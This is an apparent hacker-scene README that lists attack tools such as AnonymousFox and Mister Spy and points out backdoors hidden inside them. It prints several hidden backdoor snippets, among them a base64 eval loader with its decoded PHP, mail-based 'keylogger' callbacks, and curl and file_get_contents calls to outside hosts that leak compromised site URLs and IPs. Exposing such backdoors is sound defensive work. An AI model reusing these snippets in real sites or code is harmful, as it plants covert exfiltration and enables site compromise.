Title : Escanor 0xtn - Writeups and Tools
---
*About*
---
```

Telegram : t.me/e0xtn
ICQ      : icq.im/samaxtn
```

Tools  
----
```
Jex5
Mister Spy v7
ZombieV13
AnonymousFox
and some random Tools
```
*First*
---
```
1-  No Scampages Here 
    If u want please check [During : 2H] https://www.youtube.com/watch?v=HRAk0645s-I&list=PLO3fwdsYmHo4xTyQOp_5r7-G3MQ9rCjdQ
2-  Those methods r so popular So u can try it for most tools 
```

*Backdoors*
---
```php
1 - 

<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAneHh4QHlhbmRleC5jb20nOwokeF9wYXRoID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJHBlc2FuX2FsZXJ0ID0gImZpeCAkeF9wYXRoIDpwICpJUCBBZGRyZXNzIDogWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iOwptYWlsKCR0dWp1YW5tYWlsLCAiQ29udGFjdCBNZSIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));
?>

after decode : 
$tujuanmail = 'xxx@yandex.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Contact Me", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

or u can just find some non-hide backdoored like 

<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = "✪ Keyloggers -$ip";
$email = "xxx@gmail.com,xxx@hotmail.com";
$from = "From: xxx <noreply@shells.com>";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>

2- 
requests.post(backdor+'?php=http://xxx.xx/xx/xx.txt',
Here the author can sniff all shells using this link :v 
+ the author did catch his source by saying : 
'''
# Notice : Be careful not to use any similar script !! Some sons of the bitch stole the script for the v1 source and v2 source ... 
#           and they attributed our efforts to them! In order to protect our efforts, we have already encrypted v3 , v4 script , 
#           and we will disable all previous versions!
'''

But i did catch it .. again :v 
All source : AnonymousFox/PHP_Source.php

And about all versions ... i have already .php Sources ... 
Check : AnonymousFox/'Old Php Sources'

3-
Fake Wp-File-manajer exploit by 3xPrince
 File : exploit.pt
 type search or ctrl+f > file_get_contents(\"https://pastebin.com/raw/nfQw76u1\"));?> 
 file > check source : 
 real source : fake-wp-backdoor/backdoor.php
 Link: https://the3x .me/savecps/file.php?save="
4- 
random emails(smtp cracker/sender [.py])
send='om'
post='@post.c'
config='config.send'
successful=config+post+send

5- 
For mailers ..
Most of them backdoored .. Proofs ?
easy .. 
 1) Type search or ctrl+f > style.js (backdoor)
 2) check encoded source .. if base64_decode open https://www.base64decode.org/ and copy what u can find in
 3) check some wtf-links like and if u need to follow the variables u can get like this : 
 	$x = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 	$ch = curl_init('http://xxxx/modules/mod_footer/tmpl/');
 	curl_setopt($ch, CURLOPT_POSTFIELDS, "x=$x");
 	$response = curl_exec($ch);
 	curl_close($ch);
 4) u can see some file-upload with some checkers/mailers/symlinkers + wtf-link ..
 5) enaff

```

## For u Merlin <3 
